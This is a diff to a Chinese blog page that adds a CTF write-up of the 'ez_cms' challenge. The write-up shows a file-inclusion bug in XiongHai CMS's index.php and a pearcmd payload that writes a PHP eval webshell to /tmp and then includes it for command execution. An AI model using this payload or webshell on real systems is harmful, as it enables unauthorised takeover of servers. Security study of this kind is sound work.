@@ -228,7 +228,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">872字</span>
+        <span class="post-count">1.2k字</span>
       </span>
     </span>
 
@@ -237,7 +237,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">4分</span>
+        <span class="post-count">5分</span>
       </span>
     </span>
     
@@ -432,7 +432,32 @@ rv <span class="token operator">=</span> <span class="token boolean">None</span>
 <p>进入&#x2F;console页面输入pin码即可实现命令执行获取flag</p>
 <p><img src="/blog/2023/07/25/DASCTF-2023-0X401/image-20230725150856845.png" alt="image-20230725150856845"></p>
 <hr>
-<h1 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h1>
+<h1 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h1><blockquote>
+<p>熊海cms+pearcmd</p>
+</blockquote>
+<p>可以参考<a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%89%8D%E5%8F%B0RCE">y4爷的博客</a></p>
+<p>这题我一开始能找到任意文件读取、sql注入和垂直越权的漏洞，但是没啥用，后台文件上传也传不进马</p>
+<p>这里利用到的是前台文件包含实现RCE的方法：<a href="https://c1oudfl0w0.github.io/blog/2023/07/25/LFI%E5%8C%85%E5%90%ABpearcmd-php%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">pearcmd</a></p>
+<p>在熊海CMS的入口文件index.php处存在文件包含</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">//单一入口模式</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//关闭错误显示</span>
+<span class="token variable">$file</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//接收文件名</span>
+<span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token operator">==</span><span class="token string single-quoted-string">''</span><span class="token operator">?</span><span class="token string single-quoted-string">'index'</span><span class="token punctuation">:</span><span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token comment">//判断为空或者等于index</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'files/'</span><span class="token operator">.</span><span class="token variable">$action</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//载入相应文件</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注意，在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装</p>
+<p>这个老CMS一定是php5版本，所以存在pearcmd</p>
+<p>那么接下来就是最麻烦的问题了：这个pearcmd的路径不在&#x2F;usr&#x2F;local下而是在&#x2F;usr&#x2F;share下，比赛时这里能卡不少时间</p>
+<p>知道位置接下来就是payload随便打了</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">?+config-create+/&amp;r=../../../../../../../../../../../../usr/share/php/pearcmd&amp;/<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>+/tmp/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/07/25/DASCTF-2023-0X401/image-20230804190905501.png" alt="image-20230804190905501"></p>
+<p>再文件包含执行一句话木马即可</p>
+<p><img src="/blog/2023/07/25/DASCTF-2023-0X401/image-20230804191652987.png" alt="image-20230804191652987"></p>
+<hr>
+
     </div>
     
     
